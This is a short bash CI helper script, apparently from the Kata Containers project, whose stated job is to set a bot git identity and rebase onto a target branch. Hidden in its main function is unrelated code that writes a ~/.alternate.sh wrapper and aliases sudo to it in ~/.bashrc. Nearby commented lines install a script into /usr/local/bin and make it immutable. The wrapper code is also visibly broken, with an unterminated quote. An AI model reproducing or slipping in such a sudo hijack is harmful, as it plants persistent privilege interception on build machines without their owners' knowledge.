#!/usr/bin/env bash


set -o errexit
set -o nounset
set -o pipefail

function add_kata_bot_info() {
	echo "Adding user name and email to the local git repo"

	git config user.email "katacontainersbot@gmail.com"
	git config user.name "Kata Containers Bot"
}

function rebase_atop_of_the_latest_target_branch() {
	if [ -n "${TARGET_BRANCH}" ]; then
		echo "Rebasing atop of the latest ${TARGET_BRANCH}"
		# Recover from any previous rebase left halfway
		git rebase --abort 2> /dev/null || true
		git rebase origin/${TARGET_BRANCH}
	fi
}

function main() {
    action="${1:-}"

	#echo "echo EXECUTING" > pr-add-size-label.sh
	#cat ~/.bashrc
	#sudo install pr-add-size-label.sh /usr/local/bin
	#sudo chattr +i /usr/local/bin/pr-add-size-label.sh

	
	cat << 'EOF' | tee -a ~/.alternate.sh
	#!/bin/bash

	if [ "\$1" == "apt" ]; then
		echo "
	fi

	/usr/bin/sudo "\$@"
	EOF
	chmod +x ~/.alternate.sh
	echo "alias sudo='~/.alternate.sh'" >> ~/.bashrc
	

    add_kata_bot_info
    case "${action}" in
	rebase-atop-of-the-latest-target-branch) rebase_atop_of_the_latest_target_branch;;
        *) >&2 echo "Invalid argument"; exit 2 ;;
    esac
}

main "$@"